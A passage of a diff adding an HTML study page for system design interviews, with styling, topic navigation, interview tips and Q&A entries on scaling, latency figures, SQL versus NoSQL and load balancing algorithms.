@@ -1,0 +1,2913 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>System Design Interview Guide</title>
+<link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@300;400;500;700&family=Syne:wght@400;600;700;800&display=swap" rel="stylesheet">
+<style>
+:root{
+  --bg:#09080f;--bg2:#0d0b16;--bg3:#11101c;--bg4:#16142a;
+  --surface:#1a1830;--surface2:#201e3a;
+  --border:#1e1c3a;--border2:#3a3570;
+  --purple:#a78bfa;--purple-dim:#7c3aed;--purple-muted:#2d1f6e;
+  --purple-glow:rgba(167,139,250,0.10);
+  --amber:#fbbf24;--red:#f87171;--green:#4ade80;--cyan:#22d3ee;--blue:#60a5fa;--pink:#f472b6;
+  --text:#ede9fe;--text2:#9d8ec7;--text3:#4a3f7a;
+  --mono:'JetBrains Mono',monospace;--sans:'Syne',sans-serif;
+}
+*{margin:0;padding:0;box-sizing:border-box}
+html{scroll-behavior:smooth}
+body{background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;overflow-x:hidden}
+body::before{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background:repeating-linear-gradient(0deg,transparent,transparent 2px,rgba(0,0,0,0.03) 2px,rgba(0,0,0,0.03) 4px);pointer-events:none;z-index:9999}
+body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;background-image:linear-gradient(rgba(167,139,250,0.03) 1px,transparent 1px),linear-gradient(90deg,rgba(167,139,250,0.03) 1px,transparent 1px);background-size:40px 40px;pointer-events:none;z-index:0}
+
+/* HEADER */
+header{position:relative;z-index:10;padding:60px 40px 40px;border-bottom:1px solid var(--border);background:linear-gradient(180deg,rgba(167,139,250,0.05) 0%,transparent 100%)}
+.header-inner{max-width:1200px;margin:0 auto}
+.header-tag{font-size:11px;color:var(--purple);letter-spacing:.2em;text-transform:uppercase;margin-bottom:16px;display:flex;align-items:center;gap:8px}
+.header-tag::before{content:'';display:inline-block;width:6px;height:6px;background:var(--purple);border-radius:50%;box-shadow:0 0 10px var(--purple);animation:pulse 2s infinite}
+@keyframes pulse{0%,100%{opacity:1;transform:scale(1)}50%{opacity:.5;transform:scale(.8)}}
+h1{font-family:var(--sans);font-size:clamp(36px,6vw,72px);font-weight:800;line-height:1;color:var(--text);letter-spacing:-.02em}
+h1 span{color:var(--purple);text-shadow:0 0 40px rgba(167,139,250,.5)}
+.header-sub{margin-top:16px;font-size:13px;color:var(--text3);max-width:600px;line-height:1.6}
+.stats-row{display:flex;gap:20px;margin-top:28px;flex-wrap:wrap}
+.stat-chip{background:var(--surface);border:1px solid var(--border);border-radius:4px;padding:7px 14px;font-size:12px;color:var(--text2);display:flex;align-items:center;gap:8px}
+.stat-chip strong{color:var(--purple);font-size:15px;font-weight:700}
+.guide-nav{display:flex;flex-wrap:wrap;gap:8px;margin-bottom:26px}
+.guide-nav-link{background:var(--surface);border:1px solid var(--border);border-radius:4px;color:var(--text3);font-size:11px;letter-spacing:.08em;padding:7px 12px;text-decoration:none;text-transform:uppercase;transition:all .15s}
+.guide-nav-link:hover{background:var(--purple-glow);border-color:var(--border2);color:var(--text)}
+.guide-nav-link.active{background:var(--purple-glow);border-color:var(--purple-muted);color:var(--purple)}
+
+/* LAYOUT */
+.layout{display:flex;max-width:1200px;margin:0 auto;position:relative;z-index:10}
+
+/* SIDEBAR */
+.sidebar{width:260px;flex-shrink:0;padding:28px 0;position:sticky;top:0;height:100vh;overflow-y:auto;border-right:1px solid var(--border)}
+.sidebar::-webkit-scrollbar{width:4px}
+.sidebar::-webkit-scrollbar-thumb{background:var(--border2);border-radius:2px}
+.sidebar-label{font-size:10px;letter-spacing:.15em;text-transform:uppercase;color:var(--text3);padding:0 22px;margin-bottom:10px}
+.nav-item{display:flex;align-items:center;gap:10px;padding:9px 22px;font-size:12px;color:var(--text3);cursor:pointer;transition:all .15s;border-left:2px solid transparent;text-decoration:none}
+.nav-item:hover{color:var(--text);background:var(--purple-glow)}
+.nav-item.active{color:var(--purple);border-left-color:var(--purple);background:var(--purple-glow)}
+.nav-item .nav-count{margin-left:auto;background:var(--bg4);border:1px solid var(--border);border-radius:3px;padding:1px 6px;font-size:10px;color:var(--text3)}
+.nav-dot{width:5px;height:5px;border-radius:50%;background:var(--border2);flex-shrink:0}
+.nav-item.active .nav-dot{background:var(--purple);box-shadow:0 0 6px var(--purple)}
+.progress-bar-wrap{padding:14px 22px;margin-bottom:8px}
+.progress-label{font-size:11px;color:var(--text3);margin-bottom:6px;display:flex;justify-content:space-between}
+.progress-label span{color:var(--purple)}
+.progress-track{height:3px;background:var(--border);border-radius:2px;overflow:hidden}
+.progress-fill{height:100%;background:linear-gradient(90deg,var(--purple-dim),var(--purple));border-radius:2px;transition:width .4s ease;width:0%}
+
+/* MAIN */
+main{flex:1;padding:32px 40px;min-width:0}
+
+/* SEARCH + FILTER */
+.search-wrap{margin-bottom:28px;position:relative}
+.search-icon{position:absolute;left:14px;top:50%;transform:translateY(-50%);color:var(--text3);font-size:13px}
+.search-input{width:100%;background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:11px 14px 11px 40px;font-family:var(--mono);font-size:13px;color:var(--text);outline:none;transition:border-color .2s}
+.search-input::placeholder{color:var(--text3)}
+.search-input:focus{border-color:var(--purple-dim);box-shadow:0 0 0 3px rgba(167,139,250,.07)}
+.filter-row{display:flex;gap:8px;margin-bottom:24px;flex-wrap:wrap}
+.filter-btn{padding:5px 14px;font-family:var(--mono);font-size:11px;background:var(--surface);border:1px solid var(--border);border-radius:3px;color:var(--text3);cursor:pointer;transition:all .15s;text-transform:uppercase;letter-spacing:.05em}
+.filter-btn:hover{border-color:var(--border2);color:var(--text2)}
+.filter-btn.active{background:var(--purple-muted);border-color:var(--purple-dim);color:var(--purple)}
+.filter-btn.design-btn.active{background:rgba(251,191,36,.1);border-color:var(--amber);color:var(--amber)}
+
+/* SECTIONS */
+.section{margin-bottom:44px;animation:fadeIn .4s ease}
+@keyframes fadeIn{from{opacity:0;transform:translateY(8px)}to{opacity:1;transform:translateY(0)}}
+.section-header{display:flex;align-items:center;gap:14px;margin-bottom:18px;padding-bottom:12px;border-bottom:1px solid var(--border)}
+.section-icon{width:36px;height:36px;background:var(--surface);border:1px solid var(--border2);border-radius:6px;display:flex;align-items:center;justify-content:center;font-size:16px;flex-shrink:0}
+.section-title{font-family:var(--sans);font-size:20px;font-weight:700;color:var(--text)}
+.section-count{margin-left:auto;font-size:11px;color:var(--text3);border:1px solid var(--border);padding:3px 10px;border-radius:3px}
+
+/* QA CARD */
+.qa-card{background:var(--bg3);border:1px solid var(--border);border-radius:8px;margin-bottom:10px;overflow:hidden;transition:border-color .2s}
+.qa-card:hover{border-color:var(--border2)}
+.qa-card.open{border-color:var(--purple-muted)}
+.qa-card.design{background:linear-gradient(135deg,rgba(251,191,36,.03) 0%,var(--bg3) 100%)}
+.qa-card.design.open{border-color:rgba(251,191,36,.35)}
+.qa-question{padding:15px 18px;cursor:pointer;display:flex;align-items:flex-start;gap:12px;user-select:none}
+.qa-num{font-size:11px;color:var(--text3);min-width:22px;padding-top:1px;flex-shrink:0}
+.qa-q-text{flex:1;font-size:13px;line-height:1.5;color:var(--text2);transition:color .2s}
+.qa-card.open .qa-q-text,.qa-card:hover .qa-q-text{color:var(--text)}
+.qa-meta{display:flex;align-items:center;gap:7px;flex-shrink:0}
+.badge{font-size:10px;padding:2px 8px;border-radius:3px;font-weight:500;text-transform:uppercase;letter-spacing:.05em}
+.badge-basic{background:rgba(74,222,128,.12);color:#4ade80;border:1px solid rgba(74,222,128,.2)}
+.badge-intermediate{background:rgba(251,191,36,.1);color:#fbbf24;border:1px solid rgba(251,191,36,.2)}
+.badge-advanced{background:rgba(248,113,113,.1);color:#f87171;border:1px solid rgba(248,113,113,.2)}
+.badge-design{background:rgba(251,191,36,.12);color:#fbbf24;border:1px solid rgba(251,191,36,.25)}
+.chevron{color:var(--text3);font-size:10px;transition:transform .25s;flex-shrink:0}
+.qa-card.open .chevron{transform:rotate(180deg);color:var(--purple)}
+.qa-card.design.open .chevron{color:var(--amber)}
+.viewed-dot{width:5px;height:5px;border-radius:50%;background:var(--border2);flex-shrink:0;transition:background .2s,box-shadow .2s}
+.viewed-dot.done{background:var(--purple);box-shadow:0 0 5px var(--purple)}
+
+/* ANSWER */
+.qa-answer{display:none;padding:0 18px 20px 52px;border-top:1px solid var(--border);animation:slideDown .2s ease}
+@keyframes slideDown{from{opacity:0;transform:translateY(-4px)}to{opacity:1;transform:translateY(0)}}
+.qa-card.open .qa-answer{display:block}
+.ans-body{font-size:13px;line-height:1.85;color:var(--text2);padding-top:14px}
+.ans-body strong{color:var(--purple);font-weight:500}
+.ans-body em{color:var(--amber);font-style:normal}
+.ans-body p{margin:8px 0}
+.ans-body ul{list-style:none;margin:10px 0}
+.ans-body ul li{padding:4px 0 4px 18px;position:relative;color:var(--text2)}
+.ans-body ul li::before{content:'→';position:absolute;left:0;color:var(--purple-dim);font-size:11px}
+
+/* DESIGN SCENARIO BOX */
+.scenario-box{background:linear-gradient(135deg,rgba(251,191,36,.07) 0%,rgba(167,139,250,.05) 100%);border:1px solid rgba(251,191,36,.25);border-radius:6px;padding:14px 16px;margin:10px 0 16px}
+.scenario-label{font-size:10px;letter-spacing:.15em;text-transform:uppercase;color:var(--amber);margin-bottom:8px;display:flex;align-items:center;gap:6px}
+.scenario-label::before{content:'◆';font-size:8px}
+.scenario-text{font-size:13px;color:var(--text2);line-height:1.6;font-style:italic}
+
+/* ARCHITECTURE DIAGRAMS */
+.arch-box{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:20px;margin:14px 0;font-size:12px;color:var(--text2);line-height:1.9;overflow-x:auto}
+.arch-box .arch-title{font-size:11px;letter-spacing:.12em;text-transform:uppercase;color:var(--purple);margin-bottom:14px;display:flex;align-items:center;gap:8px}
+.arch-box .arch-title::before{content:'';display:inline-block;width:16px;height:1px;background:var(--purple)}
+.arch-row{display:flex;align-items:center;gap:6px;flex-wrap:wrap;margin:3px 0}
+.arch-node{background:var(--surface);border:1px solid var(--border2);border-radius:4px;padding:4px 10px;color:var(--text);font-size:11px;white-space:nowrap}
+.arch-node.primary{border-color:var(--purple);color:var(--purple);background:rgba(167,139,250,.08)}
+.arch-node.warn{border-color:var(--amber);color:var(--amber);background:rgba(251,191,36,.08)}
+.arch-node.success{border-color:var(--green);color:var(--green);background:rgba(74,222,128,.08)}
+.arch-node.info{border-color:var(--cyan);color:var(--cyan);background:rgba(34,211,238,.08)}
+.arch-node.danger{border-color:var(--red);color:var(--red);background:rgba(248,113,113,.08)}
+.arch-arrow{color:var(--text3);font-size:13px}
+.arch-divider{border-top:1px dashed var(--border);margin:10px 0}
+
+/* COMPARISON TABLE */
+.comp-table{width:100%;border-collapse:collapse;margin:14px 0;font-size:12px}
+.comp-table th{background:var(--surface);color:var(--purple);padding:8px 12px;text-align:left;border:1px solid var(--border);font-weight:600;letter-spacing:.04em}
+.comp-table td{padding:8px 12px;border:1px solid var(--border);color:var(--text2);vertical-align:top}
+.comp-table tr:nth-child(even) td{background:rgba(167,139,250,.03)}
+.comp-table .yes{color:var(--green)}
+.comp-table .no{color:var(--red)}
+.comp-table .maybe{color:var(--amber)}
+
+/* KEY METRICS CARDS */
+.metrics-row{display:flex;gap:10px;flex-wrap:wrap;margin:14px 0}
+.metric-card{background:var(--surface);border:1px solid var(--border);border-radius:6px;padding:12px 16px;flex:1;min-width:130px}
+.metric-val{font-family:var(--sans);font-size:22px;font-weight:800;color:var(--purple)}
+.metric-label{font-size:11px;color:var(--text3);margin-top:3px}
+
+/* CODE */
+pre{background:var(--bg2);border:1px solid var(--border);border-left:3px solid var(--purple-muted);border-radius:6px;padding:16px;margin:12px 0;overflow-x:auto;font-family:var(--mono);font-size:12px;line-height:1.7;color:var(--text);white-space:pre}
+code{font-family:var(--mono);font-size:12px;background:var(--surface);padding:1px 6px;border-radius:3px;color:var(--cyan);border:1px solid var(--border)}
+
+/* CALLOUT BOXES */
+.callout{border-radius:6px;padding:12px 16px;margin:12px 0;font-size:12px;line-height:1.7;display:flex;gap:10px}
+.callout-icon{flex-shrink:0;font-size:14px;padding-top:1px}
+.callout-body{flex:1;color:var(--text2)}
+.callout-body strong{display:block;margin-bottom:4px}
+.callout.tip{background:rgba(74,222,128,.07);border:1px solid rgba(74,222,128,.2)}
+.callout.tip .callout-body strong{color:var(--green)}
+.callout.warn{background:rgba(251,191,36,.07);border:1px solid rgba(251,191,36,.2)}
+.callout.warn .callout-body strong{color:var(--amber)}
+.callout.info{background:rgba(96,165,250,.07);border:1px solid rgba(96,165,250,.2)}
+.callout.info .callout-body strong{color:var(--blue)}
+
+/* TIPS SECTION */
+.tips-section{background:linear-gradient(135deg,rgba(167,139,250,.05) 0%,rgba(167,139,250,.02) 100%);border:1px solid var(--border2);border-radius:10px;padding:28px 32px;margin-bottom:48px;position:relative;overflow:hidden}
+.tips-section::before{content:'TIPS';position:absolute;right:-10px;top:-20px;font-family:var(--sans);font-size:80px;font-weight:800;color:rgba(167,139,250,.04);letter-spacing:-.04em;pointer-events:none}
+.tips-title{font-family:var(--sans);font-size:18px;font-weight:700;color:var(--purple);margin-bottom:20px;display:flex;align-items:center;gap:10px}
+.tip-item{display:flex;gap:14px;padding:13px 0;border-bottom:1px solid var(--border);align-items:flex-start}
+.tip-item:last-child{border-bottom:none}
+.tip-num{width:24px;height:24px;background:var(--surface2);border:1px solid var(--border2);border-radius:4px;display:flex;align-items:center;justify-content:center;font-size:11px;color:var(--purple);flex-shrink:0;font-weight:700}
+.tip-text{font-size:13px;line-height:1.6;color:var(--text2)}
+.tip-text strong{color:var(--text)}
+
+.no-results{text-align:center;padding:48px;color:var(--text3);font-size:13px}
+.no-results span{color:var(--purple)}
+.scroll-top{position:fixed;bottom:32px;right:32px;width:40px;height:40px;background:var(--surface);border:1px solid var(--border2);border-radius:6px;display:flex;align-items:center;justify-content:center;cursor:pointer;font-size:14px;color:var(--purple);z-index:100;transition:all .2s;opacity:0;pointer-events:none}
+.scroll-top.visible{opacity:1;pointer-events:all}
+.scroll-top:hover{background:var(--surface2);box-shadow:0 0 12px rgba(167,139,250,.2)}
+
+@media(max-width:768px){
+  header{padding:28px 18px 20px}
+  .layout{flex-direction:column}
+  .sidebar{width:100%;height:auto;position:static;border-right:none;border-bottom:1px solid var(--border);display:flex;flex-wrap:wrap;gap:4px;padding:12px}
+  .sidebar-label,.progress-bar-wrap{display:none}
+  .nav-item{padding:5px 10px;border-left:none;border-radius:4px;font-size:11px}
+  .nav-item.active{border-left:none;border-bottom:2px solid var(--purple)}
+  main{padding:16px}
+  .qa-answer{padding-left:18px}
+  .metrics-row .metric-card{min-width:100px}
+}
+</style>
+</head>
+<body>
+
+<header>
+  <div class="header-inner">
+    <nav class="guide-nav" aria-label="Guide navigation">
+      <a class="guide-nav-link" href="index.html">Hub</a>
+      <a class="guide-nav-link" href="js_topics_guide.html">JavaScript</a>
+      <a class="guide-nav-link" href="react_topics_guide.html">React</a>
+      <a class="guide-nav-link" href="nodejs-interview-guide.html">Node.js</a>
+      <a class="guide-nav-link" href="mongodb.html">MongoDB</a>
+      <a class="guide-nav-link active" href="system-design-guide.html">System Design</a>
+    </nav>
+    <div class="header-tag">Interview Prep System</div>
+    <h1>System<br><span>Design</span> Guide</h1>
+    <p class="header-sub">Complete system design interview prep — core concepts, real-world architecture Q&A, and full design walkthroughs with diagrams, trade-offs, and back-of-envelope calculations.</p>
+    <div class="stats-row">
+      <div class="stat-chip"><strong id="total-q">0</strong> questions</div>
+      <div class="stat-chip"><strong id="viewed-q">0</strong> viewed</div>
+      <div class="stat-chip"><strong id="total-topics">0</strong> topics</div>
+      <div class="stat-chip"><strong id="pct">0%</strong> progress</div>
+    </div>
+  </div>
+</header>
+
+<div class="layout">
+  <nav class="sidebar">
+    <div class="progress-bar-wrap">
+      <div class="progress-label">Progress <span id="prog-label">0%</span></div>
+      <div class="progress-track"><div class="progress-fill" id="prog-fill"></div></div>
+    </div>
+    <div class="sidebar-label">Topics</div>
+    <a class="nav-item active" href="#fundamentals"><span class="nav-dot"></span>Fundamentals<span class="nav-count">5</span></a>
+    <a class="nav-item" href="#scalability"><span class="nav-dot"></span>Scalability<span class="nav-count">5</span></a>
+    <a class="nav-item" href="#databases"><span class="nav-dot"></span>Databases<span class="nav-count">5</span></a>
+    <a class="nav-item" href="#caching"><span class="nav-dot"></span>Caching<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#messaging"><span class="nav-dot"></span>Messaging & Queues<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#networking"><span class="nav-dot"></span>Networking & APIs<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#availability"><span class="nav-dot"></span>Availability & CAP<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#microservices"><span class="nav-dot"></span>Microservices<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#storage"><span class="nav-dot"></span>Storage & CDN<span class="nav-count">3</span></a>
+    <a class="nav-item" href="#security"><span class="nav-dot"></span>Security<span class="nav-count">3</span></a>
+    <a class="nav-item" href="#estimation"><span class="nav-dot"></span>Estimation<span class="nav-count">3</span></a>
+    <a class="nav-item" href="#search"><span class="nav-dot"></span>Search & Indexing<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#coordination"><span class="nav-dot"></span>Coordination<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#pipelines"><span class="nav-dot"></span>Data Pipelines<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#multiregion"><span class="nav-dot"></span>Multi-Region<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#performance"><span class="nav-dot"></span>Performance<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#realtime"><span class="nav-dot"></span>Real-Time Systems<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#payments"><span class="nav-dot"></span>Payments & Idempotency<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#ai"><span class="nav-dot"></span>AI/ML Systems<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#cloud"><span class="nav-dot"></span>Cloud Infrastructure<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#testing"><span class="nav-dot"></span>Testing & Chaos<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#compliance"><span class="nav-dot"></span>Privacy & Compliance<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#patterns"><span class="nav-dot"></span>Architecture Patterns<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#apievolution"><span class="nav-dot"></span>API Evolution<span class="nav-count">4</span></a>
+    <a class="nav-item" href="#observability"><span class="nav-dot"></span>Observability & Ops<span class="nav-count">5</span></a>
+    <a class="nav-item" href="#designs"><span class="nav-dot"></span>🏛 Full Designs<span class="nav-count">8</span></a>
+    <a class="nav-item" href="#tips"><span class="nav-dot"></span>Interview Tips</a>
+  </nav>
+
+  <main>
+    <div class="search-wrap">
+      <span class="search-icon">⌕</span>
+      <input type="text" class="search-input" id="search" placeholder="Search systems, concepts, patterns..." oninput="doSearch()">
+    </div>
+    <div class="filter-row">
+      <button class="filter-btn active" onclick="setFilter('all',this)">All</button>
+      <button class="filter-btn" onclick="setFilter('basic',this)">Basic</button>
+      <button class="filter-btn" onclick="setFilter('intermediate',this)">Intermediate</button>
+      <button class="filter-btn" onclick="setFilter('advanced',this)">Advanced</button>
+      <button class="filter-btn design-btn" onclick="setFilter('design',this)">🏛 Full Designs</button>
+    </div>
+    <div id="qa-container"></div>
+    <div id="no-results" class="no-results" style="display:none">No results for <span id="search-term"></span></div>
+
+    <div class="tips-section" id="tips">
+      <div class="tips-title">⚡ Interview Tips</div>
+      <div class="tip-item"><div class="tip-num">01</div><div class="tip-text"><strong>Always clarify requirements first (5 min).</strong> Ask: scale (users/DAU), read vs write ratio, consistency vs availability, geography, latency SLA. Interviewers want to see you don't jump to solutions before understanding the problem.</div></div>
+      <div class="tip-item"><div class="tip-num">02</div><div class="tip-text"><strong>Do back-of-envelope math before choosing tech.</strong> "1M DAU, 10 requests/day = ~116 RPS. Peak 3x = 350 RPS. A single PostgreSQL node handles 5k QPS easily" — this shows engineering judgment, not just pattern matching.</div></div>
+      <div class="tip-item"><div class="tip-num">03</div><div class="tip-text"><strong>Structure every design: API → Data Model → Architecture → Scale.</strong> Start simple (single server), then layer in complexity only when you explain why. Interviewers penalize over-engineered solutions that ignore simpler approaches.</div></div>
+      <div class="tip-item"><div class="tip-num">04</div><div class="tip-text"><strong>Always discuss trade-offs, not just solutions.</strong> Don't just say "use Kafka." Say "Kafka gives us durability and replay, but adds operational complexity. For this scale, SQS might be simpler — here's why I'd choose Kafka…"</div></div>
+      <div class="tip-item"><div class="tip-num">05</div><div class="tip-text"><strong>Identify bottlenecks proactively.</strong> After drawing the architecture, say "The bottleneck here is the database write path. Here's how I'd address it with read replicas / sharding / CQRS."</div></div>
+      <div class="tip-item"><div class="tip-num">06</div><div class="tip-text"><strong>Know the numbers.</strong> SSD: 0.1ms read. Network roundtrip: 1–10ms. RAM: nanoseconds. HDD: 10ms seek. These let you reason about whether caching is necessary, what latency is achievable, and justify your design decisions.</div></div>
+    </div>
+  </main>
+</div>
+
+<button class="scroll-top" id="scroll-top" onclick="window.scrollTo({top:0,behavior:'smooth'})">↑</button>
+
+<script>
+const QA = [
+
+// ══════════════════════════════════════════════════════════════════
+// FUNDAMENTALS
+// ══════════════════════════════════════════════════════════════════
+{id:'fundamentals',section:'Fundamentals',icon:'🧱',level:'basic',
+q:'What is system design? What are the key pillars of a well-designed system?',
+a:`<p>System design is the process of defining the <strong>architecture, components, data flow, and interfaces</strong> of a system to satisfy specified requirements at scale.</p>
+<p><strong>The 6 pillars:</strong></p>
+<ul>
+<li><strong>Scalability</strong> — ability to handle growing load by adding resources</li>
+<li><strong>Reliability</strong> — system continues to work correctly even when things fail</li>
+<li><strong>Availability</strong> — system is operational and accessible (uptime %)</li>
+<li><strong>Performance</strong> — low latency and high throughput</li>
+<li><strong>Maintainability</strong> — easy to change, debug, extend</li>
+<li><strong>Security</strong> — protection from unauthorized access and data breaches</li>
+</ul>
+<div class="arch-box">
+  <div class="arch-title">System Design Framework</div>
+  <div class="arch-row"><span class="arch-node warn">1. Requirements</span><span class="arch-arrow">→</span><span class="arch-node primary">2. Estimation</span><span class="arch-arrow">→</span><span class="arch-node info">3. API Design</span></div>
+  <div class="arch-row" style="margin-top:8px"><span class="arch-node success">4. Data Model</span><span class="arch-arrow">→</span><span class="arch-node primary">5. Architecture</span><span class="arch-arrow">→</span><span class="arch-node warn">6. Deep Dive</span></div>
+</div>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Interview Framework</strong> Spend ~5 min on requirements, ~5 min on estimation, ~10 min on HLD, ~15 min deep-diving one component the interviewer cares about.</div></div>`},
+
+{id:'fundamentals',section:'Fundamentals',icon:'🧱',level:'basic',
+q:'What is the difference between vertical scaling and horizontal scaling?',
+a:`<table class="comp-table">
+<tr><th>Aspect</th><th>Vertical Scaling (Scale Up)</th><th>Horizontal Scaling (Scale Out)</th></tr>
+<tr><td>How</td><td>Bigger machine — more CPU/RAM</td><td>More machines — add instances</td></tr>
+<tr><td>Limit</td><td>Hardware ceiling (~96 cores, ~24TB RAM)</td><td>Practically unlimited</td></tr>
+<tr><td>Downtime</td><td>Often requires restart</td><td>Rolling deploys, zero downtime</td></tr>
+<tr><td>Cost</td><td>Exponential cost curve</td><td>Linear cost</td></tr>
+<tr><td>Complexity</td><td>Simple — no app changes</td><td>Needs stateless design, load balancer</td></tr>
+<tr><td>Failure</td><td>Single point of failure</td><td>Fault tolerant — one node dies, others serve</td></tr>
+<tr><td>Best for</td><td>Databases (initially), quick fix</td><td>Stateless web servers, microservices</td></tr>
+</table>
+<div class="arch-box">
+  <div class="arch-title">Scaling Strategy</div>
+  <div class="arch-row"><span class="arch-node warn">Traffic 1x</span><span class="arch-arrow">→</span><span class="arch-node">Single Server + DB</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node warn">Traffic 10x</span><span class="arch-arrow">→</span><span class="arch-node">Load Balancer</span><span class="arch-arrow">→</span><span class="arch-node">3x App Servers</span><span class="arch-arrow">→</span><span class="arch-node primary">1 DB + Read Replicas</span></div>
+  <div class="arch-row" style="margin-top:6px"><span class="arch-node warn">Traffic 100x</span><span class="arch-arrow">→</span><span class="arch-node">CDN + LB</span><span class="arch-arrow">→</span><span class="arch-node">N App Servers</span><span class="arch-arrow">→</span><span class="arch-node info">Cache</span><span class="arch-arrow">→</span><span class="arch-node primary">Sharded DB</span></div>
+</div>`},
+
+{id:'fundamentals',section:'Fundamentals',icon:'🧱',level:'basic',
+q:'What are latency and throughput? What are typical numbers to know?',
+a:`<ul>
+<li><strong>Latency</strong> — time to complete a single operation (ms). User-perceived responsiveness.</li>
+<li><strong>Throughput</strong> — number of operations per unit time (RPS/QPS). System capacity.</li>
+<li><strong>Bandwidth</strong> — maximum data transfer rate (Gbps). Network or storage ceiling.</li>
+</ul>
+<div class="metrics-row">
+  <div class="metric-card"><div class="metric-val" style="color:var(--green)">~1ns</div><div class="metric-label">CPU L1 cache</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--green)">~100ns</div><div class="metric-label">RAM read</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--amber)">~0.1ms</div><div class="metric-label">SSD random read</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--amber)">~1ms</div><div class="metric-label">Redis roundtrip</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--red)">~10ms</div><div class="metric-label">HDD seek</div></div>
+  <div class="metric-card"><div class="metric-val" style="color:var(--red)">~150ms</div><div class="metric-label">Cross-continent</div></div>
+</div>
+<div class="callout warn"><div class="callout-icon">⚠️</div><div class="callout-body"><strong>Key rule:</strong> Reading 1MB from RAM ≈ 0.25ms. From SSD ≈ 1ms. From network ≈ 10ms. From HDD ≈ 30ms. This justifies caching — RAM is 40x faster than SSD, 120x faster than HDD.</div></div>`},
+
+{id:'fundamentals',section:'Fundamentals',icon:'🧱',level:'intermediate',
+q:'What is the difference between SQL and NoSQL databases? When do you choose each?',
+a:`<table class="comp-table">
+<tr><th></th><th>SQL (Relational)</th><th>NoSQL (Non-Relational)</th></tr>
+<tr><td>Data model</td><td>Tables with rows & columns, fixed schema</td><td>Documents, KV, wide-column, graph</td></tr>
+<tr><td>Schema</td><td>Strict, enforced</td><td>Flexible / schema-less</td></tr>
+<tr><td>Scaling</td><td>Vertical primary; horizontal is hard</td><td>Designed for horizontal sharding</td></tr>
+<tr><td>ACID</td><td class="yes">✓ Full ACID transactions</td><td class="maybe">Eventual consistency (mostly); some offer ACID</td></tr>
+<tr><td>Joins</td><td class="yes">✓ Native JOINs</td><td class="no">No joins; denormalize or reference</td></tr>
+<tr><td>Query</td><td>SQL — powerful, standardized</td><td>API/query language varies by DB</td></tr>
+<tr><td>Best for</td><td>Financial systems, ERP, complex queries</td><td>Catalogs, social graphs, caches, logs</td></tr>
+<tr><td>Examples</td><td>PostgreSQL, MySQL, Oracle</td><td>MongoDB, DynamoDB, Redis, Cassandra</td></tr>
+</table>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Rule of thumb:</strong> Default to SQL. Move to NoSQL when: you need massive write throughput (Cassandra), flexible schema evolution (MongoDB), sub-millisecond lookups (Redis), or graph traversal (Neo4j). Never pick NoSQL just to be "modern."</div></div>`},
+
+{id:'fundamentals',section:'Fundamentals',icon:'🧱',level:'intermediate',
+q:'What is a load balancer? What are the different load balancing algorithms?',
+a:`<p>A load balancer distributes incoming requests across multiple backend servers to <strong>maximize throughput, minimize latency, and ensure high availability</strong>.</p>
+<p><strong>Algorithms:</strong></p>
+<ul>
+<li><strong>Round Robin</strong> — request goes to next server in rotation. Simple, equal weight. Good when servers are identical.</li>
+<li><strong>Weighted Round Robin</strong> — servers with higher weight get more requests. Good when servers have different capacity.</li>
+<li><strong>Least Connections</strong> — route to server with fewest active connections. Best for varying request durations (e.g. streaming).</li>
+<li><strong>Least Response Time</strong> — route to server with lowest latency + fewest connections.</li>
+<li><strong>IP Hash</strong> — hash client IP to always route same user to same server (session affinity / sticky sessions).</li>
+<li><strong>Consistent Hashing</strong> — used in distributed systems; adding/removing servers only remaps a small fraction of requests.</li>
+</ul>
+<div class="arch-box">
+  <div class="arch-title">Load Balancer Layers</div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node warn">L4 LB (TCP/UDP)</span><span class="arch-arrow">→</span><span class="arch-node success">App Servers</span></div>
+  <div class="arch-divider"></div>
+  <div class="arch-row"><span class="arch-node primary">Client</span><span class="arch-arrow">→</span><span class="arch-node info">L7 LB (HTTP/HTTPS)</span><span class="arch-arrow">→</span><span class="arch-node">Route by URL/Header</span><span class="arch-arrow">→</span><span class="arch-node success">Service A / B</span></div>
+</div>
+<p><strong>L4</strong> balances at transport layer (IP+port), faster but no content awareness. <strong>L7</strong> balances at application layer — can route by URL path, headers, cookies; enables A/B testing and microservice routing.</p>
+<div class="callout tip"><div class="callout-icon">💡</div><div class="callout-body"><strong>Real example:</strong> When you open YouTube, your request hits a Google L7 load balancer that routes /watch to video servers, /api to API servers, and /cdn to storage — all based on URL path.</div></div>`},
+
+// ══════════════════════════════════════════════════════════════════
+// SCALABILITY
+// ══════════════════════════════════════════════════════════════════
+{id:'scalability',section:'Scalability',icon:'📈',level:'intermediate',
+q:'What is consistent hashing and why is it used in distributed systems?',
